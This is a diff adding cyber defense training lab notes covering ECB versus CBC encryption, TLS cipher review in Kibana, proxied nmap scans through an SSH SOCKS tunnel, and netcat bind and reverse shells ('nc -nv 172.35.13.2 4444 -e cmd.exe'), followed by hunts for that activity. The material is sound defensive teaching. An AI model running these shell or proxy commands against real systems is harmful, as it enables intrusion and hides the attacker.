@@ -2125,52 +2125,779 @@ This time there is no match for the password, despite being an e xtremely weak 
 
 ---------------------------------------------
 
+Encryption Scenario
+Encryption is focused on the confidentiality aspect of the CIA triad, and its function is to scramble the data so that unauthorized individuals cannot read the data being exchanged. Unlike hashing, which is a one-way function, encryption is a two-way function, which means it can be reversed. There are two primary forms of encryption: symmetric and asymmetric. Symmetric encryption uses the same key to encrypt and decrypt, while asymmetric encryption uses one key to encrypt and another key to decrypt. Symmetric encryption is typically used to secure communications, while asymmetric encryption is typically used in Public Key Infrastructure (PKI) to validate the identity of the server or client as well as key exchange. The following scenario examines a custom implementation of a program that uses symmetric encryption.
+
+﻿
+
+Scenario: The mission partner uses a custom application to encrypt sensitive documents sent over the network. However, they noticed information from these documents on open-source business databases. They requested CPT assistance in locating the root of the problem.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the kali-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. View the following script used by the mission partner to encrypt documents:
+
+(trainee@dmss-kali)-[~] $ less -N ~/m2l5/encryption/file_encryptor.py
+
+
+![image](https://github.com/user-attachments/assets/fe06851c-b06d-4c97-8d76-307a048dbdcd)
+
+Some of the output is truncated in the screenshot as there are 70 lines. From the imports, it appears that the underlying algorithm in use is Data Encryption Standard (DES). DES is a symmetric block cipher that operates on blocks of data 64 bits in size. While the key length of DES is 8 bytes, it uses one byte for parity so it effectively has a key strength of 56 bits. In the 1970s when DES was developed, no computer could be expected to brute force the algorithm. Now, specialized computers are capable of cracking a DES key in about a day.
+
+
+Other than brute force, there are attacks that are capable of defeating the DES algorithm such as differential cryptanalysis, linear cryptanalysis, and improved Davies' attack. These attacks are not covered in this course.
+
+
+NIST now recommends the usage of an Advanced Encryption Standard (AES) if a block cipher is needed, though 3DES is acceptable for use with legacy applications. Like with hashing algorithms, any custom encryption algorithm is a huge red flag and should absolutely not be used to secure sensitive data on Federal systems.
+
+
+This program has another glaring flaw. In line 23, there is a reference to an Electronic Code Book (ECB) mode. Encryption modes refer to additional operations that can be applied alongside the encryption algorithm itself. If an encryption algorithm is cryptographically secure, then why apply operations to the data? The data is adequately protected, is it not? The answer is no, for similar reasons that hashing algorithms need salts.
+
+
+ECB encrypts every block the same way. Therefore, if the original text has whitespace or repeats information such as message headers across different messages, that block is the same as well. ECB should never be used because it allows adversaries to see patterns (e.g., headers and footers within text or whitespace in an image, which may allow them to deduce the plaintext despite being encrypted).
+
+
+3. Execute the following script to view the image using ristretto — a preinstalled image viewer:
+ristretto ~/m2l5/resources/secret.bmp &
+
+
+![image](https://github.com/user-attachments/assets/4d5a240c-32be-4a24-9893-4ee608f3c417)
+
+It is a picture of text reading Super secret text.
+
+
+4. Encrypt the file by running the following command:
+(trainee@dmss-kali)-[~] $ python3 ~/m2l5/encryption/file_encryptor.py ~/m2l5/resources/secret.bmp picture.enc
+
+![image](https://github.com/user-attachments/assets/9ef02fff-adb4-4ebc-aab4-3731f901ce3a)
+
+
+This encrypts the file and writes the encrypted data to picture.enc using DES in ECB mode.
+
+
+5. Copy the file header from the unencrypted file to a temporary file:
+(trainee@dmss-kali)-[~] $ head -c 54 ~/m2l5/resources/secret.bmp > picture.tmp
 
 
 
+6. Copy the encrypted bytes to the temporary picture, omitting where the file header would be:
+(trainee@dmss-kali)-[~] $ tail -c +55 picture.enc >> picture.tmp
 
 
 
+7. Execute the following script to view the new picture using ristretto:
+(trainee@dmss-kali)-[~] $ ristretto picture.tmp &
+
+![image](https://github.com/user-attachments/assets/ba65887e-3094-4487-8216-d1df5450a2d8)
+
+Note that the checkered background is not part of the image, but part of the image viewer.
+
+
+This is why encrypting everything the exact same way may compromise confidentiality. ECB enables patterns in the underlying data to surface, which may allow adversaries to deduce what the original message was, even without a key. This is a problem regardless of the encryption algorithm used, whether it was DES or AES; therefore, never use ECB as an encryption mode. Another alternative that generates more randomness is Cipher Block Chaining (CBC). CBC mode eXclusive ORs (XOR) an unencrypted block with the previous block and then encrypts the block using the specified algorithm. Since this mode relies on the previous block to compute the current block, an Initialization Vector (IV) is needed for the very first block. CBC has the advantage of a single change to cascade throughout the rest of the data as well, causing even more randomness in the ciphertext.
+
+
+The following steps change the encryption mode used by the program.
+
+
+8. Make a copy of the file encryption program.
+(trainee@dmss-kali)-[~] $ cp ~/m2l5/encryption/file_encryptor.py ~/m2l5/encryption/file_encryptor.py.bak
 
 
 
+9. Run the following command to use CBC mode in the program rather than ECB.
+(trainee@dmss-kali)-[~] $ sed -i 's/ECB/CBC/' ~/m2l5/encryption/file_encryptor.py
+
+![image](https://github.com/user-attachments/assets/f0b4a032-1674-4800-8f3f-e23d2631bb01)
+
+The sed command changes lines 23 and 28.
+
+
+10. Encrypt the file again.
+(trainee@dmss-kali)-[~] $ python3 ~/m2l5/encryption/file_encryptor.py ~/m2l5/resources/secret.bmp picture_cbc.enc
 
 
 
+11. Copy the header from the unencrypted file and the data from the newly encrypted file.
+(trainee@dmss-kali)-[~] $ head -c 54 ~/m2l5/resources/secret.bmp > picture.tmp
+(trainee@dmss-kali)-[~] $ tail -c +55 picture_cbc.enc >> picture.tmp
 
 
 
+12. Execute the following script to view the file that was encrypted using CBC mode rather than EBC mode.
+(trainee@dmss-kali)-[~] $ ristretto picture.tmp &
+
+![image](https://github.com/user-attachments/assets/d6c83bf8-b415-4a83-9ce5-15c5148ee9eb)
+
+Notice that there is no discernible pattern while using CBC. Other modes that are not ECB generate a similar amount of randomness.
+
+
+------------------------------------------
+
+Detecting Insecure Cryptography over the Network
+To establish a secure channel over the internet with no prior knowledge of who the person is, three things are needed:
+
+Key exchange: A method to secure exchange keys.
+
+Bulk encryption algorithm: Encrypts most of the communications.
+
+Message Authentication Code (MAC): A method to verify integrity of the message that is transmitted with the message.
+
+Key exchange functions use asymmetric encryption. Diffie-Hellman (DH) key exchange is a popular method used to exchange keys and can technically be used for PKI, but is usually not, which is why DH does not provide for authentication. RSA is the dominant PKI algorithm in the market, which uses Certificate Authorities (CA) to verify the authenticity of entities on the internet, and can also be used for key exchange. DH and RSA are often used together to authenticate individuals and exchange keys.
+
+﻿
+
+The bulk encryption encrypts most of the communications, which may contain a lot of data. It needs to be fast, which asymmetric encryption is not. Symmetric ciphers are often thousands of times faster than asymmetric algorithms. This is why asymmetric encryption is used to share a symmetric cipher key or a session key. The session key is used with a symmetric encryption algorithm to encrypt the session.
+
+﻿
+
+The MAC ensures that the message was not changed between the sender and receiver. This is where hashes come in; the session key is combined with the data, and then the hash is calculated and transmitted along with the ciphertext. This ensures that only the sender or receiver could have been communicants of the session, as the session key is needed to generate the correct hash. The process described here is actually a hash-based message authentication code or HMAC. There are other methods of generating MACs that are not covered in this lesson.
+
+﻿
+
+These components — asymmetric encryption, symmetric encryption, and hashing — all work together to provide secure communications over the network.
+
+﻿
+
+Transport Layer Security (TLS) is a protocol that secures traffic from prying eyes and handles the implementation of the different types of cryptography. TLS is the successor to Secure Socket Layer (SSL). While originally developed with web browsing in mind, TLS can be used for much more than for HTTP security; it can secure many other protocols as well.
+
+﻿
+
+In the following lab, the transport protocols that secure communications over the network and their underlying cipher-suites using Zeek SSL logs are examined.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the kali-hunt VM using the provided credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Firefox and browse to the Security Onion page with the bookmark using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+3. After authenticating, navigate to the Kibana Discover page.
+
+﻿
+
+4. Set the following time range:
+
+November 4, 2021 @ 16:00 - November 4, 2021 @ 18:00
+
+﻿![image](https://github.com/user-attachments/assets/6154d063-50ea-45c8-a9e3-4b5ae83c5dbb)
+
+5. Enter the following filter to only view entries related to SSL/TLS.
+event.dataset:ssl
+
+![image](https://github.com/user-attachments/assets/6506cddc-12db-4704-b0d8-5d9a543b9a8a)
+
+
+6. Toggle the following columns:
+client.ip
+ssl.server_name
+ssl.version
+ssl.cipher
+
+![image](https://github.com/user-attachments/assets/30d9884d-f1b8-4091-88b9-8d93cf1504a3)
+
+In the ssl.cipher field, notice which cipher suite is used.
+
+
+Breaking out the cipher suite from the first few results:
+The key exchange algorithm is Elliptic Curve Diffie Hellman Exchange (ECDH) and RSA.
+
+![image](https://github.com/user-attachments/assets/49da43c4-f016-4ce1-8521-51076c8e779d)
+
+The bulk encryption mechanism is AES using a 256-bit key and CBC mode.
+
+![image](https://github.com/user-attachments/assets/ee577e5d-3b7f-47f0-a7aa-7477179dffa6)
+
+
+Message integrity is verified using SHA2-384.
+
+![image](https://github.com/user-attachments/assets/fe6a8ac3-05fa-4c4b-aace-8dd4d3dbef91)
+
+Cipher suites are implemented via SSL/TLS. Notice that the SSL version used for the host ch-smtp.vcch.gov is TLS version 1.2.
+
+
+A brief history on SSL and the naming convention to prevent future confusion as they are often used interchangeably: Netscape developed the SSL protocol and released the first version in 1995 as SSL version 2 (SSLv2); SSLv1 was never released. In 1996, Netscape released the next version, SSLv3, and turned it over to the Internet Engineering Task Force (IETF). The IETF made minor modifications and released it in 1999 as TLSv1.0. The most recent release is TLSv1.3. In chronological order, the versions of SSL/TLS are as follow:
+SSLv2
+SSLv3
+TLSv1.0
+TLSv1.1
+TLSv1.2
+TLSv1.3
+
+All versions before TLS 1.2 were deprecated due to security vulnerabilities, as specified in the Request For Comments (RFC) 6176, RFC 7568, and RFC 8996. For example, SSLv3 and some implementations of TLS were found to be vulnerable to the Padding Oracle On Downgraded Legacy Encryption (POODLE) attack. The vulnerabilities exist in SSL/TLS, not the underlying cipher suite. To adhere to best security practices, disable TLS versions 1.1 and older on all clients in a network as well as servers hosting webpages.
+
+![image](https://github.com/user-attachments/assets/d7ae478d-9504-407e-ba54-0191dd5b5651)
+
+
+-------------------------------------------------------
+
+Attacks on Weak Cryptography
+A user in the mission partner's network mentioned that they have been a victim of identity theft despite using encryption over the network. The mission partner requested CPT assistance to get to the bottom of the issue. The senior host analyst on the team suspects there may be an issue with weak encryption. Investigate why the client may be experiencing data theft.
+
+User IP address: 192.168.110.130
+Workflow
+
+﻿
+
+1. Log in to the kali-hunt VM using the provided credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Firefox and browse to the Security Onion page with the bookmark using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+3. After authenticating, navigate to the Kibana Discover page.
+
+﻿
+
+4. Set the following time range:
+
+November 4, 2021 @ 16:00 - November 4, 2021 @ 18:00
+
+![image](https://github.com/user-attachments/assets/96d33899-d87c-4142-b563-160dfcdb4e57)
+
+Running the following query returns all the information about SSL/TLS sessions that involved the 192.168.110.130 host.
+event.dataset:ssl and client.ip:192.168.110.130
+
+![image](https://github.com/user-attachments/assets/b8b56528-2c85-4b9d-a429-e1062614f81a)
+
+More information about the hashing algorithm used by the host can be found in the ssl.ciphers.keyword field. Figure 7.5-29 shows a Lens visualization for the ssl.cipher.keyword field.
+
+![image](https://github.com/user-attachments/assets/dbd41937-e5ad-4fc9-80d9-e0bd06e74753)
+
+he hashing algorithms used were SHA, SHA256, and SHA384. Recall that SHA0 and SHA1 have been deemed insecure and unsuitable for password storage, and both may be referred to as SHA. The possible cipher suites using a hashing algorithm that may be unsuitable for password storage are:
+TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+TLS_RSA_WITH_AES_256_CBC_SHA
+
+In this instance, SHA is referencing SHA1.
+
+
+![image](https://github.com/user-attachments/assets/0c9403cc-462f-4fa2-8dc4-8204dc8dd60e)
+
+
+------------------------------------------
+
+Investigation | Encryption
+The same query and output as before can be used to find the answer to this question.
+
+event.dataset:ssl and client.ip:192.168.110.130
+
+![image](https://github.com/user-attachments/assets/56141984-ccd8-431d-8833-083163161dab)
+
+More information about the encryption used by the host can be found in the ssl.ciphers field.
+
+![image](https://github.com/user-attachments/assets/619d7ad7-49fe-458c-9a1f-59795d5066cc)
+
+From this output, notice:
+All sessions used AES.
+There were two encryption modes used: CBC and GCM.
+The two key sizes used for AES were 128 and 256. The minimum key size recommendation for any block cipher by NIST is 112 bits, though AES does not have an option for a 112-bit key size.
+
+------------------------------------------------
+
+Investigation | Transport Protocols
+Recall that the only acceptable versions of SSL/TLS are 1.2 and 1.3. Therefore, the following query returns the correct answer.
+
+event.dataset:ssl and client.ip:192.168.110.130  and not ssl.version:(TLSv13 or TLSv12)
+﻿
+![image](https://github.com/user-attachments/assets/14068144-a41b-4f24-83cc-d5ac0f93b7f3)
+
+
+Weak cryptography usage in deprecated versions of TLS/SSL was discovered, which may be contributing to the mission partner's data loss
+
+---------------------------
+
+####### CDAH-M7L6 Credential Stuffing/Password Cracking #######
 
 
 
+---------------------------------------------
+
+###### CDAH-M7L7 Using an Attack Proxy #######
+
+Attack Proxy Use
+
+orkflow
+
+
+1. Log in to the red-kali Virtual Machine (VM) using the following credentials:
+Username: trainee
+Password: CyberTraining1!
 
 
 
+2. From a terminal window, execute a port scan against a device in the mission partner infrastructure. 
+
+
+In order to save time, only the top 25 ports are scanned. In a live environment, threat actors conduct more extensive reconnaissance to determine all possible points of entry.
+(trainee@red-kali)- [~] $ nmap -Pn --top-ports 25 128.0.7.25
+
+![image](https://github.com/user-attachments/assets/d98f3b0e-041a-4203-9b46-c98b70496e48)
+
+The output of this device shows that it is running an SMTP server.
+
+![image](https://github.com/user-attachments/assets/a6b570d3-3a14-4c0f-b946-fb7a079e4da3)
+
+
+3. Create a dynamic SSH tunnel between the attacker machine and a peer device that has been co-opted for use in this reconnaissance campaign.
+(trainee@red-kali)- [~] $ ssh -D 0.0.0.0:9050 -N -f trainee@128.0.7.207
 
 
 
+In this SSH command, the following options are used:
+-D. Creates a local dynamic port forwarding service to the remote device. The argument to this option indicates the local IP address to bind to and the local port to bind to. In this command, the address 0.0.0.0 indicates all addresses on all interfaces.
+-N. Tells the process not to execute a remote command upon connecting. This is useful for only forwarding ports.
+-f. Indicates that the SSH process that created the dynamic port needs to go to the background, which removes user interaction.
+
+The Linux manual page describes how the tunnel is created:
+
+
+"This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh acts as a SOCKS server."
+
+
+This tunnel is created to form a proxy SOCKS4 through which traffic from another application, in this case Nmap, is transmitted. An examination of the configuration file proxychains reveals that it sends traffic through the localhost port 9050, which was created by the command.
+
+
+4. Execute the same scan again, but this time, direct all traffic through the proxy SOCKS4 created by the SSH tunnel.
+(trainee@red-kali)- [~] $ proxychains nmap -Pn --top-ports 25 128.0.7.25
 
 
 
+This command sends the network traffic created by the Nmap scan through the local port 9050 to the proxy SOCKS4 to the destination at 128.0.7.25, while appearing to originate from the proxy itself at 128.0.7.207. 
+
+![image](https://github.com/user-attachments/assets/46174699-4723-45ae-956f-01fc9567be51)
+
+The process takes about 5 minutes to fully execute. For attacks in which the timing of the arriving traffic is important, especially in the case of an exploit involving a race condition, this time delay is inexcusable on the part of the attacker.
+
+
+In such a case, attackers choose an alternative course of action to circumvent this problem. One option is to obtain a single-use attacking device that is not proxied, with the understanding that the activity is collected and logged. Anothe r option is  to script and schedule an attack that executes from a node further forward in the communication stream. This option is non-interactive but mitigates any time delay problems created by proxy use. 
+
+![image](https://github.com/user-attachments/assets/de532af6-2210-4782-800c-eaf6c189efb4)
+
+Several timeout errors are initially displayed, but the scan executes. A few timeout errors are returned after the scan has completed.
+
+![image](https://github.com/user-attachments/assets/4309bf60-5386-411a-8586-99541f650130)
+
+The same output returns, but the traffic flow is different when the second command is executed, which is seen in an examination of a capture of the network traffic which follows.
+
+![image](https://github.com/user-attachments/assets/3599b0fa-bec3-41cd-88e9-39242919a061)
+
+
+------------------------------------------------
+
+Reviewing Network Logs
+Since two network scans were issued from the attacker's workstation, a network capture to observe the differences between the two from the perspective of a defender's network sensor can be examined. Reviewing captures such as these is a routine task when conducting hunt or response actions to known threat activity. 
+
+﻿
+
+Use Arkime to examine the traffic produced by the normal and proxied scans conducted. In this inspection, recognize that the identity of the attacking workstation is obfuscated during the second scan.
+
+Workflow
+
+
+1. Log in to the win-hunt VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
 
 
 
+2. Open the Arkime bookmark from Chrome, and log in using the following credentials:
+Username: trainee
+Password: CyberTraining1!
 
 
 
+3. Set Time Range to a range that encompasses the network scans previously completed.
+
+
+![image](https://github.com/user-attachments/assets/079ef903-2ba8-4a1a-b07c-99d7ac9f101b)
+
+4. Set the following filter to find the network traffic of the scans recently completed:
+ip.dst == 172.35.3.3 && ip.src == 128.0.7.205
 
 
 
+This filter finds the sessions from the attacking workstation that are communicating with the mission partner's SMTP server.
+
+
+The sessions view of Arkime only shows traffic from full TCP-connected sessions. Only the packets sent to open ports are visible, as the packets from all the filtered ports are dropped by the host.
+
+
+The IP address of the SMTP server is 172.35.3.3. Due to network translation, the address which the attacker was able to see was 128.0.7.25, to which the Nmap scans were directed.
+
+![image](https://github.com/user-attachments/assets/6e429a31-7b04-4608-9a77-bed8b8433f44)
+
+5. Replace the IP address of the attacking workstation with the IP address of the proxy to observe the second scan.
+ip.dst == 172.35.3.3 && ip.src == 128.0.7.207
+
+![image](https://github.com/user-attachments/assets/99e4eab0-ce0c-4f7e-999d-734130d7059c)
+
+The output is otherwise similar, but the source address is that of the proxy, and there is no other indication in the traffic that the scan originated on the other device. If a threat actor is practicing appropriate tradecraft, the logs of this second scan are all that a defender works from. If an appropriately resourced attacker conducts reconnaissance from one proxy and exploitation from a different proxy, the task of coordinating defenses against an entity becomes extremely complicated.
+
+
+As an analyst or defender, if the profile of potential threats includes such sophisticated actors, a far more effective strategy is to defend against the tradecraft itself, rather than identify the source of the threat.
+
+--------------------------------------------------------------------------
+
+####### CDAH-M8L1-Interactive Shells #######
+
+
+Establish a Bind Shell
+Establish a bind shell with the target machine from an attacker's perspective. In the following tasks, the ch-tech-1 Virtual Machine (VM) is used at the attacker host and the ch-tech-2 VM is used at the target (victim) host. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the ch-tech-1 VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Windows PowerShell from the taskbar.
+
+﻿
+
+3. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:
+
+PS C:\Users\trainee\> cd Desktop
+PS C:\Users\trainee\Desktop> .\nc.exe
+﻿
+
+NOTE: The following screen indicates success of the Netcat executable:
+
+![image](https://github.com/user-attachments/assets/f918617c-d961-4d67-b0a9-2fc94a25a3d4)
+
+
+4. Log in to the ch-tech-2 VM using the following credentials:
+Username: trey.pitts
+Password: Password123
 
 
 
+5. Open Windows PowerShell from the taskbar.
+
+
+6. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:
+PS C:\Users\trey.pitts> cd Desktop
+PS C:\Users\trey.pitts\Desktop> .\nc.exe
 
 
 
+7. From the Cmd line, execute the following command:
+Cmd line: -nvlp 4444 -e cmd.exe
 
 
 
+The following command opens a listener on port 4444 on the ch-tech-2 VM:
 
+![image](https://github.com/user-attachments/assets/6a3cce30-a5ec-44e9-99e4-8da38ffded60)
+
+The open listener defines that anyone who connects to the ch-tech-2 VM via Transmission Control Protocol (TCP) port 4444 presents with a Command-Line Interface (CLI).
+
+
+8. In a new PowerShell window, execute the following command:
+PS C:\Users\trey.pitts> netstat -ano
+
+
+
+This command provides a table containing TCP connections with IP address, port, and process number:
+
+![image](https://github.com/user-attachments/assets/7371cd7a-bc1c-42a2-ab3c-5d65d00eeeb6)
+
+Notice listening port 4444 is associated with Process ID (PID) 3728. This process is the Netcat listener and is different in each lab setting.
+
+
+9. Return to the ch-tech-1 VM. From the Cmd line, execute the following command:
+Cmd line: -nv 172.35.13.3 4444
+
+
+
+Successful execution of the command provides CLI access to user trey.pitts:
+
+![image](https://github.com/user-attachments/assets/6bd35a60-1814-4b7e-a739-5eb70a3d6871)
+
+Using Netcat, a bind shell session has been created on ch-tech-2 and connected to from the ch-tech-1 VM. The user of the ch-tech-1 VM now has CLI access to the user trey.pitts. It is through this method that an attacker, once access has been gained to a system, can open a listener, access CLI remotely, and retrieve data. It is important to remember that no firewalls or NAT are present, making the bind shell possible.
+
+
+10. Return to the ch-tech-2 VM. In the PowerShell window that is not running Netcat, execute the following command to recheck the network connections:
+PS C:\Users\trey.pitts> netstat -ano
+
+![image](https://github.com/user-attachments/assets/2bbc5e5f-e476-43d2-a66b-f98acf085e67)
+
+Notice port 4444 is no longer in a listening state and includes the IP address of the attacker machine (172.35.13.2) in an established state.
+
+
+11. Enter exit to close the PowerShell session. 
+
+![image](https://github.com/user-attachments/assets/a9938569-c813-4d8d-aa7f-83b3f851c79c)
+
+------------------------------------------------
+
+stablish a Reverse Shell
+Establish a reverse shell with the target machine from an attacker's perspective. The ch-tech-1 VM is used as the attacker host, and the ch-tech-2 VM is used as the target (victim) host. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the ch-tech-1 VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Windows PowerShell from the taskbar.
+
+﻿
+
+3. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:
+
+PS C:\Users\trainee\Desktop> .\nc.exe
+﻿
+
+4. From the Cmd line, execute the following command:
+
+Cmd line: -nvlp 4444
+﻿
+
+NOTE: Since this is a reverse shell, the listener is set up on our attacker machine and the communications are initiated from the target machine. 
+
+﻿
+
+5. Log in to the ch-tech-2 VM using the following credentials:
+
+Username: trey.pitts
+Password: Password123
+﻿
+
+6. Open Windows PowerShell from the taskbar.
+
+﻿
+
+7. From the PowerShell session, access Netcat (nc.exe), located on the desktop, by executing the following command:
+
+PS C:\Users\trey.pitts\Desktop> .\nc.exe
+﻿
+
+8. From the Cmd line, execute the following command:
+
+Cmd line: -nv 172.35.13.2 4444 -e cmd.exe
+﻿
+
+This establishes a connection to ch-tech-1 (172.35.13.2):
+
+![image](https://github.com/user-attachments/assets/153844f9-fabc-4bea-a46d-29a08580c298)
+
+9. Return to the ch-tech-1 VM. Figure 8.1-10 shows the Windows PowerShell session:
+
+![image](https://github.com/user-attachments/assets/1ca38475-bf81-4df2-be9b-7380e90b50bd)
+
+This command is similar to the bind shell, however, the -e flag passes the cmd.exe as a parameter to it allowing a reverse shell to establish. Notice we now have access to the CLI on ch-tech-2 as user trey.pitts. Using a reverse shell the connection is established from the target machine, avoiding detection and firewall rules. 
+
+![image](https://github.com/user-attachments/assets/ea265bbf-d52a-44db-aa47-73fb72f10a73)
+
+
+--------------------------------------
+
+Identifying Suspicious Shell Activity in Event Logs
+Use Kibana in the Elastic Stack to identify suspicious destination IP addresses. Uncommon destination IP addresses can be indicative of persistence of the adversary; this task creates visualizations to analyze and detect suspicious destination IP addresses.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Google Chrome from the taskbar.
+
+﻿
+
+3. Open the Discover - Elastic bookmark.
+
+﻿
+
+4. Access Security Onion and Elastic Stack using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+5. Select the three-line menu on the left, within the menu, under Analytics, select Visualize Library.
+
+﻿
+
+6. Within Visualize Library, select Create Visualization.
+
+﻿
+
+7. Within New visualization, select Aggregation Based > Data Table.
+
+﻿
+
+8. Within New Data table/Choose a source, select *:so-*. The table looks like Figure 8.1-13:
+
+![image](https://github.com/user-attachments/assets/2253442c-f3ce-4d25-8479-b69e220411c5)
+
+NOTE: The count is different from the screenshot due to Kibana's defaulting to a timeframe of Last 24 hours. 
+
+
+9. Set the time and date range to: Nov 1, 2021 @ 00:00:00.000 -> Nov 8, 2021 @ 23:30:00.000.
+
+
+10. Under Buckets, select Add. Add a bucket with the following selections:
+Split rows
+Aggregation: Terms
+Field: agent.hostname.keyword
+Metric: Count
+Order: Descending 
+Size: 100
+
+This bucket adds the hostnames of host reporting to Elastic Stack to the data table.
+
+
+11. Under Buckets, select Add. Add a bucket with the following selections:
+Split rows
+Aggregation: Terms
+Field: destination.port
+Metric: Count
+Order: Descending 
+Size: 100
+
+This bucket adds the destination ports of all communications from the hosts reporting to Elastic Stack to the data table.
+
+
+12. Under Buckets, select Add. Add a bucket with the following selections:
+Split rows
+Aggregation: Terms
+Field: destination.ip
+Metric: Count
+Order: Descending 
+Size: 100
+
+This bucket adds the destination IP addresses of all communications from the hosts reporting to Elastic Stack to the data table.
+
+![image](https://github.com/user-attachments/assets/6f8d44bb-fd1a-4dd8-a6af-a7b82b7ff344)
+
+This can help visualize the logs that contain vital communication information. During a hunt or investigation, this can be used to quickly analyze destination IP addresses and ports to identify potentially suspicious activity. IP addresses and ports that populate with significantly less frequency should be reviewed immediately to determine if the activity is expected.  
+
+
+The type of process used by hosts can help to identify suspicious activity. An unexpected or mysterious process can be quickly identified by the communications collected by the SIEM.
+
+
+13. Under Buckets, select Add. Add a bucket with the following selections:
+Split rows
+Aggregation: Terms
+Field: process.name.keyword
+Metric: Count
+Order: Descending 
+Size: 100
+
+This bucket adds the process name utilized in the communications from the hosts reporting to Elastic Stack to the data table.
+
+
+![image](https://github.com/user-attachments/assets/d5c9d5ea-568d-47b5-a3fc-edc990e9cd81)
+
+14. Navigate to page 2 of the Data Table, as shown in Figure 8.1-16. Notice the two entries for the use of nc.exe on port 4444, the executable for Netcat. Netcat was used to create bind and reverse shells in this lesson. 
+
+![image](https://github.com/user-attachments/assets/194a22f4-c121-4656-9944-48f6f8dba312)
+
+------------------------------------------------
+
+Suspicious Activity in the VCCH Network
+The network team has discovered a few large communications occurring on the city hall network occurring over a 7-day span (Nov 2, 2021 @ 00:00:00.000 -> Nov 10, 2021 @ 00:00:00.000). Large communications are rare, however, as they consume a large amount of bandwidth triggering the network team to investigate. The network team needs the help of security analysts to look into the bandwidth anomalies and determine if the activity is suspicious. Begin by accessing VCCH's Elastic Stack via the use of the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+After accessing the win-hunt VM, access Security Onion and Elastic Stack using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+After accessing Elastic Stack, create a Data Table to aid in the investigation of the questionable network activity. 
+
+![image](https://github.com/user-attachments/assets/3671259a-02af-4efe-832f-ea3267d69b91)
+
+
+![image](https://github.com/user-attachments/assets/de161437-3363-4b89-a867-82e7dc307ef2)
+
+![image](https://github.com/user-attachments/assets/6df87ba9-fe38-441a-bec1-ff19ac66d9ea)
+
+
+--------------------------------------------------
+
+nc.exe Occurrences
+Apply a filter to the table to filter by process.name.keyword: nc.exe. The count of nc.exe then becomes visible. 
+
+﻿
+
+Once the count has been obtained, the filter can be removed to return to the data table. 
+
+
+![image](https://github.com/user-attachments/assets/178bd8d3-6215-4ddc-a5fd-fb74e4a9295e)
+
+
+Suspicious, Non-Standard, Listening Destination Port 
+
+
+There are a few suspicious ports within the table (port 4444 and 53, for example); however, 8088 is the focus of this investigation. 
+
+![image](https://github.com/user-attachments/assets/28307023-0c82-4651-bae7-6df07489df99)
+
+Port 8088 was used twice by the Netcat executable. As previously stated, often the adversary uses a non-standard listening port, such as port 8088, to conduct HTTPS traffic. It is important to note that the existence of the Netcat executable may not be suspicious. Netcat can be used to do remote network maintenance across the enterprise. The Netcat executable paired with the non-standard port 8088 is suspicious and cause for investigation. 
+
+![image](https://github.com/user-attachments/assets/73753707-4486-46c4-926a-b93b1d19363d)
+
+![image](https://github.com/user-attachments/assets/a2639bba-4962-4b5c-b462-a6b8b7ee31f6)
+
+Suspicious IP Address
+The IP address 128.0.7.206 appears only once in the table. The IP address is not similar to any of the other addresses listed on the table and is using an executable that is a known tool that can be leveraged by adversaries. 
+
+![image](https://github.com/user-attachments/assets/350a9be9-49ec-44b1-9299-7a3b65c79012)
+
+Investigation Conclusion
+Through the use and analysis of Elastic Stack and Kibana, an outlier data point within network communications has been identified. The outlier is connected via a non-standard port (8088) and a unique IP address (128.0.7.206), relative to the other IP addresses found in the collected logs. The ch-tech-1 VM needs to be further investigated for adversarial persistence and to identify what data may have been compromised through the use of an established shell. 
+
+-----------------------------------------------
 
 
 
